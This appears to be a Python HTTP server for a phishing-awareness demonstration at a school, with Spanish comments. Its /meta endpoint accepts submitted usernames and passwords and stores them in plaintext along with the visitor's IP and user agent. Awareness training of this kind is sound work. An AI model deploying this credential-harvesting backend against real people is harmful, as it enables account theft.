#!/usr/bin/env python3
"""
Servidor HTTP dual: phishing demo + awareness escuela
Ambas páginas en el MISMO servidor, MISMO puerto
"""
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import datetime
import threading
import logging
import json
from typing import Optional

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Archivos para proyecto phishing
META_FILE = os.path.join(BASE_DIR, 'meta_log.txt')
CREDS_FILE = os.path.join(BASE_DIR, 'credentials.txt')
COUNT_FILE = os.path.join(BASE_DIR, 'count.txt')
LAST_FILE = os.path.join(BASE_DIR, 'last.txt')

# Archivos para proyecto escuela
VISITS_FILE = os.path.join(BASE_DIR, 'visits.txt')
VISITOR_COUNT_FILE = os.path.join(BASE_DIR, 'visitor_count.txt')

LOCK = threading.Lock()
PORT = 5000

def init_files():
    """Inicializa todos los archivos necesarios."""
    # Archivos phishing demo
    if not os.path.exists(COUNT_FILE):
        with open(COUNT_FILE, 'w') as f:
            f.write('0')
    
    if not os.path.exists(LAST_FILE):
        with open(LAST_FILE, 'w') as f:
            f.write('—')
    
    # Archivos escuela
    if not os.path.exists(VISITOR_COUNT_FILE):
        with open(VISITOR_COUNT_FILE, 'w') as f:
            f.write('0')
    
    if not os.path.exists(VISITS_FILE):
        with open(VISITS_FILE, 'w') as f:
            f.write('# THE PILL ADO - Registro de visitas\n')

def read_count(file_path: str) -> int:
    """Lee contador desde archivo."""
    try:
        with open(file_path, 'r') as f:
            val = f.read().strip()
            return int(val) if val.isdigit() else 0
    except (FileNotFoundError, ValueError):
        return 0

def write_count(file_path: str, value: int) -> None:
    """Escribe contador en archivo."""
    try:
        with open(file_path, 'w') as f:
            f.write(str(value))
    except IOError as e:
        logger.error(f"Error escribiendo en {file_path}: {e}")

def read_last() -> str:
    """Lee último timestamp."""
    try:
        with open(LAST_FILE, 'r') as f:
            return f.read().strip() or '—'
    except FileNotFoundError:
        return '—'

def write_last(timestamp: str) -> None:
    """Escribe último timestamp."""
    try:
        with open(LAST_FILE, 'w') as f:
            f.write(timestamp)
    except IOError as e:
        logger.error(f"Error escribiendo timestamp: {e}")

class Handler(SimpleHTTPRequestHandler):
    """Handler HTTP con múltiples endpoints."""
    
    def get_real_ip(self) -> str:
        """Obtiene la IP real del cliente."""
        ip = (
            self.headers.get('X-Forwarded-For') or
            self.headers.get('X-Real-IP') or
            self.headers.get('CF-Connecting-IP') or
            self.client_address[0]
        )
        if ',' in ip:
            ip = ip.split(',')[0].strip()
        return ip
    
    def log_message(self, format, *args):
        """Logs con IP real."""
        real_ip = self.get_real_ip()
        logger.info("%s - %s" % (real_ip, format % args))
    
    def send_text_response(self, content: str, status: int = 200) -> None:
        """Envía respuesta de texto."""
        self.send_response(status)
        self.send_header('Content-type', 'text/plain; charset=utf-8')
        self.send_header('Cache-Control', 'no-cache')
        self.end_headers()
        self.wfile.write(content.encode('utf-8'))
    
    def do_POST(self):
        """Maneja peticiones POST."""
        
        # ENDPOINT 1: Phishing demo (captura credenciales)
        if self.path == '/meta':
            content_length = int(self.headers.get('Content-Length', 0))
            
            post_data = ''
            if content_length > 0:
                post_data = self.rfile.read(content_length).decode('utf-8')
            
            ua = self.headers.get('User-Agent', '-')
            ts = datetime.datetime.now().isoformat()
            ip = self.get_real_ip()
            
            credentials_info = "Sin datos"
            try:
                if post_data:
                    creds = json.loads(post_data)
                    credentials_info = f"Usuario: {creds.get('usuario', 'N/A')}, Password: {creds.get('password', 'N/A')}"
            except json.JSONDecodeError:
                credentials_info = "Datos inválidos"
            
            with LOCK:
                count = read_count(COUNT_FILE)
                count += 1
                write_count(COUNT_FILE, count)
                
                try:
                    with open(META_FILE, 'a') as mf:
                        mf.write(f"{ts}\t{ip}\t{ua}\n")
                except IOError as e:
                    logger.error(f"Error escribiendo meta log: {e}")
                
                try:
                    with open(CREDS_FILE, 'a') as cf:
                        cf.write(f"{ts}\t{ip}\t{credentials_info}\n")
                except IOError as e:
                    logger.error(f"Error escribiendo credenciales: {e}")
                
                write_last(ts)
            
            logger.info(f"✅ [PHISHING] Participación #{count} - IP: {ip} - {credentials_info}")
            
            self.send_response(204)
            self.end_headers()
        
        # ENDPOINT 2: Escuela (solo registra visita)
        elif self.path == '/visit':
            ua = self.headers.get('User-Agent', '-')
            ts = datetime.datetime.now().isoformat()
            ip = self.get_real_ip()
            
            with LOCK:
                count = read_count(VISITOR_COUNT_FILE)
                count += 1
                write_count(VISITOR_COUNT_FILE, count)
                
                try:
                    with open(VISITS_FILE, 'a') as vf:
                        vf.write(f"{ts}\t{ip}\t{ua}\n")
                except IOError as e:
                    logger.error(f"Error escribiendo visitas: {e}")
            
            logger.info(f"👀 [ESCUELA] Visita #{count} - IP: {ip}")
            
            self.send_response(204)
            self.end_headers()
        
        else:
            self.send_error(405, "Method Not Allowed")
    
    def do_GET(self):
        """Maneja peticiones GET."""
        
        # Stats para phishing
        if self.path == '/count':
            with LOCK:
                count = read_count(COUNT_FILE)
            self.send_text_response(str(count))
            return
        
        if self.path == '/last':
            with LOCK:
                last = read_last()
            self.send_text_response(last)
            return
        
        # Stats para escuela
        if self.path == '/visitors':
            with LOCK:
                count = read_count(VISITOR_COUNT_FILE)
            self.send_text_response(str(count))
            return
        
        # Servir archivos estáticos
        return super().do_GET()

def main():
    """Función principal del servidor."""
    os.chdir(BASE_DIR)
    init_files()
    
    server = HTTPServer(('0.0.0.0', PORT), Handler)
    logger.info(f"🚀 Servidor iniciado en puerto {PORT}")
    logger.info(f"📍 Accede en: http://<IP>:{PORT}/")
    logger.info(f"⚠️  DUAL MODE: Phishing Demo + Escuela Awareness")
    logger.info("⏹️  Presiona Ctrl+C para detener")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("\n🛑 Deteniendo servidor...")
        server.server_close()
        logger.info("✅ Servidor cerrado correctamente")
        logger.info("⚠️  CRÍTICO: Borra credentials.txt y meta_log.txt después de la demo")

if __name__ == '__main__':
    main()
